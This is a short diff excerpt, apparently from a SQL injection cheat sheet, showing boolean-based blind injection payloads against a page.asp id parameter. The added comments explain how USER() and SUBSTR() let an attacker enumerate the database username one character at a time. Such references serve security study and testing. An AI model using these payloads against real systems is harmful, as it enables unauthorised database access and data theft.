@@ -246,6 +246,8 @@ page.asp?id=1" or 1=1 -- true
 page.asp?id=1 and 1=2 -- false
 
 /* Enumerate username string */
+-- Note: USER() is a MySQL function to return the current user and hostname as a string.
+-- Use SUBSTR() method to enumerate other information too.
 page.asp?id=1 and SUBSTR(USER(), 1, 1) = 'a'
 page.asp?id=1 and SUBSTR(USER(), 1, 1) = 'd'  -- repeat 'a','d','m','i','n'
 ```
